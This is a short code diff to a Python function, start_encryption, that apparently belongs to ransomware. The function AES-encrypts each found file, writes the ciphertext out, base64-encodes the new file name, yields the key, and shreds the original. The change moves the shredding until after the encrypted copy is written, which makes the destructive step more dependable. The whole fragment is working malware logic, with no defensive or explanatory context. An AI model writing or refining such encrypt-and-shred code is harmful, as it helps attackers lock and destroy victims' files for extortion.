@@ -56,15 +56,13 @@ def start_encryption(files):
                     AES_obj = symmetric.AESCipher(key)
 
                     file_content = f.read()
-
                     encrypted = AES_obj.encrypt(file_content)
-                    utils.shred(found_file)
-
                     ef.write(encrypted)
 
                     base64_new_file_name = base64.b64encode(new_file_name.encode('utf-8')).decode('utf-8')
-
                     yield (key, base64_new_file_name)
+
+                    utils.shred(found_file)
         except:
             continue
 
